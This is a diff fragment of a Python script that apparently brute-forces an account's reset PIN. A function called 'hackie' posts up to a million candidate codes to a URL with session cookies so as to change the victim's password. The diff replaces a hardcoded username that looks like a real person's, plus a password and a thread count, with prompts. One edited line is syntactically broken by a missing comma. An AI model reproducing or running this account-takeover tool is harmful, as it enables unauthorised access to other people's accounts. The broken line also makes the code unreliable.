@@ -224,7 +224,7 @@ def hackie(arg):
       if len(codelist) == 1000000:
         pass
       else:
-        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000  \033[1;92m {}'.format(str(total), str(pin)))
+        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000/{}  \033[1;92m {}'.format(str(total),str(len(codelist)) str(pin)))
         sys.stdout.flush()
       body["n"]=str(pin)
       web = session.post(url, headers = header, cookies = cookie, data = body)
@@ -264,11 +264,11 @@ os.system(clr)
 print(logo)
 print(67 * '\033[1;92m=')
 print("email/number:")
-user = "ronila.polliente.1"#pick()
+user = pick()
 print("\033[1;92mpassword if gotten")
-userpass = "safwfw"#pick()
+userpass = pick()
 print("\033[1;92mThreads")
-threads = 10#pick()
+threads = pick()
 print('\npassword to change = {}'.format(userpass))
 codelist = machine_generator()
 if __name__=="__main__":
